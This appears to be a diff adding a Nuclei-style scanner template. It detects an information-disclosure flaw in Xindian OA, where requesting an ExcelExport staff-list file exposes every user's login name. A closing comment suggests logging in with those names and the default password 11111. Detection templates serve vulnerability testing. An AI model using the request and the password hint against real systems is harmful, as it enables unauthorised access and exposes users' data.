@@ -1,0 +1,27 @@
+id: xindianOA-ExcelExport-info-leak
+
+info:
+  name: 新点OA ExcelExport 敏感信息泄露漏洞
+  author: cnaq
+  severity: medium   
+  description: 新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用
+  reference: 
+    - http://wiki.peiqi.tech/wiki/oa/%E6%96%B0%E7%82%B9OA/%E6%96%B0%E7%82%B9OA%20ExcelExport%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
+  tags: xindianOA,info,leak
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+      - type: dsl
+        dsl:
+          - 'len(body)>1024'
+
+# 通过获取的登录名登陆后台(默认密码11111)
